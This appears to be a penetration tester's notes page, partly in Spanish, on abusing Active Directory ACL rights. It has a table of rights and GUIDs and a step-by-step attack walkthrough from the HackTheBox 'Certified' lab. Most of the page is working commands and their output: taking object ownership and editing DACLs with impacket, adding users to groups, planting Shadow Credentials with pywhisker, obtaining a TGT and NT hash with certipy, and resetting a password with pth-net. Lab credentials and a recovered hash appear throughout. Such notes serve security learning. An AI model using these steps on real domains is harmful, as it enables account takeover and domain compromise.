---
title: ACL/ACE Abuse
---

- https://www.thehacker.recipes/ad/movement/dacl/
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse


![](./img/Diagrama-ACLs.png)

|Common name|Permission value / GUID|Permission type|Description|
|---|---|---|---|
|WriteDacl|`ADS_RIGHT_WRITE_DAC`|Access Right|Edit the object's DACL (i.e. "inbound" permissions).|
|GenericAll|`ADS_RIGHT_GENERIC_ALL`|Access Right|Combination of almost all other rights.|
|GenericWrite|`ADS_RIGHT_GENERIC_WRITE`|Access Right|Combination of write permissions (Self, WriteProperty) among other things.|
|WriteProperty|`ADS_RIGHT_DS_WRITE_PROP`|Access Right|Edit one of the object's attributes. The attribute is referenced by an "ObjectType GUID".|
|WriteOwner|`ADS_RIGHT_WRITE_OWNER`|Access Right|Assume the ownership of the object (i.e. new owner of the victim = attacker, cannot be set to another user).With the "SeRestorePrivilege" right it is possible to specify an arbitrary owner.|
|Self|`ADS_RIGHT_DS_SELF`|Access Right|Perform "Validated writes" (i.e. edit an attribute's value and have that value verified and validate by AD). The "Validated writes" is referenced by an "ObjectType GUID".|
|AllExtendedRights|`ADS_RIGHT_DS_CONTROL_ACCESS`|Access Right|Peform "Extended rights". "AllExtendedRights" refers to that permission being unrestricted. This right can be restricted by specifying the extended right in the "ObjectType GUID".|
|User-Force-Change-Password|`00299570-246d-11d0-a768-00aa006e0529`|Control Access Right (extended right)|Change the password of the object without having to know the previous one.|
|DS-Replication-Get-Changes|`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`|Control Access Right (extended right)|One of the two extended rights needed to operate a [DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync).|
|DS-Replication-Get-Changes-All|`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`|Control Access Right (extended right)|One of the two extended rights needed to operate a [DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync).|
|Self-Membership|`bf9679c0-0de6-11d0-a285-00aa003049e2`|Validate Write|Edit the "member" attribute of the object.|
|Validated-SPN|`f3a64788-5306-11d1-a9c5-0000f80367c1`|Validate Write|Edit the "servicePrincipalName" attribute of the object.|

## Attack Paths

##### quickly spot vulnerable elements 

```bash
certipy find -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -vulnerable -stdout
```


### WriteOwner

Establecer usuario controlado como propietario:

```bash
impacket-owneredit -action 'write' -new-owner 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```


Otorgar derechos de usuario controlados para agregar miembros:

```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target 'management' 'certified.htb'/'judith.mader':'judith09'

[*] DACL backed up to dacledit-20241118-191233.bak
[*] DACL modified successfully!
```


Agregar usuario controlado al grupo:

```bash
net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "DC01.certified.htb"
```


### Shadow Credentials

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials

https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials#shadow-credentials


https://github.com/ShutdownRepo/pywhisker
```bash
git checkout ec30ba5759d57ead54341f58289090a9dc01249a
```

```bash
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "list"
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Listing devices for management_svc
[*] DeviceID: 1178142b-e0df-2f92-a940-d12fbeeeaa2a | Creation Time (UTC): 2024-11-19 18:36:07.904142
```

```bash
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p 'judith09' --target "management_svc" --action "add"
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 1924346f-6056-c5f1-53eb-2dfd17bdf04f
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[!] module 'OpenSSL.crypto' has no attribute 'PKCS12'
```

----------
https://github.com/fortra/impacket/issues/1716

Another solution that may help some people who are forced not to use `pip` or `pipx`, like the newest Kali system:

Google search: `python3-openssl 24.0.0 deb`, will find the `deb` file link, download it and use `dpkg` to install it, such as:

```
wget http://launchpadlibrarian.net/732112002/python3-cryptography_41.0.7-4ubuntu0.1_amd64.deb
sudo dpkg -i python3-cryptography_41.0.7-4ubuntu0.1_amd64.deb 

wget http://launchpadlibrarian.net/715850281/python3-openssl_24.0.0-1_all.deb
sudo dpkg -i python3-openssl_24.0.0-1_all.deb
```

--------------

```bash
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p 'judith09' --target "management_svc" --action "add" 
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: d35c6ab1-71dc-22e1-0401-5baffd8787b2
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: dz6ynAGT.pfx
[*] Must be used with password: bmuUfxhwMid1X6rljnmi
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```


Quitamos la contraseña del pfx

```bash
certipy-ad cert -export -pfx "dz6ynAGT.pfx" -password "bmuUfxhwMid1X6rljnmi" -out "unprotected.pfx" -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Loading PFX 'dz6ynAGT.pfx' with password None
[*] Writing PFX to 'unprotected.pfx'
```


Obtenemos los hashes del usuario management_svc del usuario sin contraseña
```bash
certipy-ad auth -pfx unprotected.pfx -dc-ip '10.10.11.41' -username 'management_svc' -domain 'certified.htb'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

```bash
sudo ntpdate certified.htb
2024-11-20 01:02:44.795611 (-0500) +25201.877997 +/- 0.019474 certified.htb 10.10.11.41 s1 no-leap
CLOCK: time stepped by 25201.877997
```

```bash
certipy-ad auth -pfx unprotected.pfx -dc-ip '10.10.11.41' -username 'management_svc' -domain 'certified.htb'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Got hash for 'management_svc@certified.htb': aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584
```



### GenericAll
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericall-on-user
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericall-rights-on-user
- https://github.com/byt3bl33d3r/pth-toolkit

```bash
pth-net rpc password "TargetUser" 'newP@ssword2022' -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```



